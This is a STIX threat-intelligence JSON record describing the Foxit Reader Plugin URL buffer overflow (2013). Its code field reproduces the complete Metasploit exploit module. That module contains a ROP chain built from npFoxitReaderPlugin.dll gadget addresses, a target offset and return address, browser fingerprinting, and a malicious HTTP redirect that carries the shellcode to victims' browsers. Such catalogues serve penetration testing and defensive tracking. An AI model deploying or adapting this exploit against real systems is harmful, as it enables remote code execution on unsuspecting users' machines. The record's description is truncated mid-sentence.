{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--07fcb88c-ef7c-431b-ba35-8eed73243798",
    "created": "2024-08-14T16:44:14.238256Z",
    "modified": "2024-08-14T16:44:14.23826Z",
    "name": "\"Foxit Reader Plugin URL Processing Buffer Overflow\"",
    "description": " This module exploits a vulnerability in the Foxit Reader Plugin, it exists in the npFoxitReaderPlugin.dll module. When loading PDF files from remote hosts",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/foxit_reader_plugin_url_bof.rb",
            "external_id": "foxit_reader_plugin_url_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20130113203143/http://secunia.com/advisories/51733/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  Rank = NormalRanking\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Foxit Reader Plugin URL Processing Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability in the Foxit Reader Plugin, it exists in\n          the npFoxitReaderPlugin.dll module. When loading PDF files from remote hosts,\n          overly long query strings within URLs can cause a stack-based buffer overflow,\n          which can be exploited to execute arbitrary code. This exploit has been tested\n          on Windows 7 SP1 with Firefox 18.0 and Foxit Reader version 5.4.4.11281\n          (npFoxitReaderPlugin.dll version 2.2.1.530).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'rgod <rgod[at]autistici.org>',       # initial discovery and poc\n          'Sven Krewitt <svnk[at]krewitt.org>', # metasploit module\n          'juan vazquez',                       # metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '89030' ],\n          [ 'BID', '57174' ],\n          [ 'EDB', '23944' ],\n          [ 'URL', 'http://web.archive.org/web/20130113203143/http://secunia.com/advisories/51733/' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 2000,\n          'DisableNops' => true\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => \"process\",\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # npFoxitReaderPlugin.dll version 2.2.1.530\n          [ 'Automatic', {} ],\n          [ 'Windows 7 SP1 / Firefox 18 / Foxit Reader 5.4.4.11281',\n            {\n              'Offset'          => 272,\n              'Ret'             => 0x1000c57d, # pop # ret # from npFoxitReaderPlugin\n              'WritableAddress' => 0x10045c10, # from npFoxitReaderPlugin\n              :rop => :win7_rop_chain\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-01-07',\n      'DefaultTarget'  => 0))\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    #Mozilla/5.0 (Windows NT 6.1; rv:18.0) Gecko/20100101 Firefox/18.0\n    nt = agent.scan(/Windows NT (\\d\\.\\d)/).flatten[0] || ''\n    firefox = agent.scan(/Firefox\\/(\\d+\\.\\d+)/).flatten[0] || ''\n\n    case nt\n      when '5.1'\n        os_name = 'Windows XP SP3'\n      when '6.0'\n        os_name = 'Windows Vista'\n      when '6.1'\n        os_name = 'Windows 7'\n    end\n\n    if os_name == 'Windows 7' and firefox =~ /18/\n      return targets[1]\n    end\n\n    return nil\n  end\n\n  def junk\n    return rand_text_alpha(4).unpack(\"L\")[0].to_i\n  end\n\n  def nops\n    make_nops(4).unpack(\"N*\")\n  end\n\n  # Uses rop chain from npFoxitReaderPlugin.dll (foxit) (no ASLR module)\n  def win7_rop_chain\n\n    # rop chain generated with mona.py - www.corelan.be\n    rop_gadgets =\n      [\n        0x1000ce1a, # POP EAX # RETN [npFoxitReaderPlugin.dll]\n        0x100361a8, # ptr to &VirtualAlloc() [IAT npFoxitReaderPlugin.dll]\n        0x1000f055, # MOV EAX,DWORD PTR DS:[EAX] # RETN [npFoxitReaderPlugin.dll]\n        0x10021081, # PUSH EAX # POP ESI # RETN 0x04 [npFoxitReaderPlugin.dll]\n        0x10007971, # POP EBP # RETN [npFoxitReaderPlugin.dll]\n        0x41414141, # Filler (RETN offset compensation)\n        0x1000614c, # & push esp # ret  [npFoxitReaderPlugin.dll]\n        0x100073fa, # POP EBX # RETN [npFoxitReaderPlugin.dll]\n        0x00001000, # 0x00001000-> edx\n        0x1000d9ec, # XOR EDX, EDX # RETN\n        0x1000d9be, # ADD EDX,EBX # POP EBX # RETN 0x10 [npFoxitReaderPlugin.dll]\n        junk,\n        0x100074a7, # POP ECX # RETN [npFoxitReaderPlugin.dll]\n        junk,\n        junk,\n        junk,\n        0x41414141, # Filler (RETN offset compensation)\n        0x00000040, # 0x00000040-> ecx\n        0x1000e4ab, # POP EBX # RETN [npFoxitReaderPlugin.dll]\n        0x00000001, # 0x00000001-> ebx\n        0x1000dc86, # POP EDI # RETN [npFoxitReaderPlugin.dll]\n        0x1000eb81, # RETN (ROP NOP) [npFoxitReaderPlugin.dll]\n        0x1000c57d, # POP EAX # RETN [npFoxitReaderPlugin.dll]\n        nops,\n        0x10005638, # PUSHAD # RETN [npFoxitReaderPlugin.dll]\n      ].flatten.pack(\"V*\")\n\n    return rop_gadgets\n  end\n\n  def on_request_uri(cli, request)\n\n    agent = request.headers['User-Agent']\n    my_target = get_target(agent)\n\n    # Avoid the attack if no suitable target found\n    if my_target.nil?\n      print_error(\"Browser not supported, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    unless self.respond_to?(my_target[:rop])\n      print_error(\"Invalid target specified: no callback function defined\")\n      send_not_found(cli)\n      return\n    end\n\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # we use two responses:\n    # one for an HTTP 301 redirect and sending the payload\n    # and one for sending the HTTP 200 OK with appropriate Content-Type\n    if request.resource =~ /\\.pdf$/\n      # sending Content-Type\n      resp = create_response(200, \"OK\")\n      resp.body = \"\"\n      resp['Content-Type'] = 'application/pdf'\n      resp['Content-Length'] = rand_text_numeric(3,\"0\")\n      cli.send_response(resp)\n      return\n    else\n      resp = create_response(301, \"Moved Permanently\")\n      resp.body = \"\"\n\n      my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n      if datastore['SSL']\n        schema = \"https\"\n      else\n        schema = \"http\"\n      end\n\n      sploit = rand_text_alpha(my_target['Offset'] - \"#{schema}://#{my_host}:#{datastore['SRVPORT']}#{request.uri}.pdf?\".length)\n      sploit << [my_target.ret].pack(\"V\") # EIP\n      sploit << [my_target['WritableAddress']].pack(\"V\") # Writable Address\n      sploit << self.send(my_target[:rop])\n      sploit << p.encoded\n\n      resp['Location'] = request.uri + '.pdf?' + Rex::Text.uri_encode(sploit, 'hex-noslashes')\n      cli.send_response(resp)\n\n      # handle the payload\n      handler(cli)\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2013-01-07",
    "x_mitre_platforms": [
        "win'"
    ]
}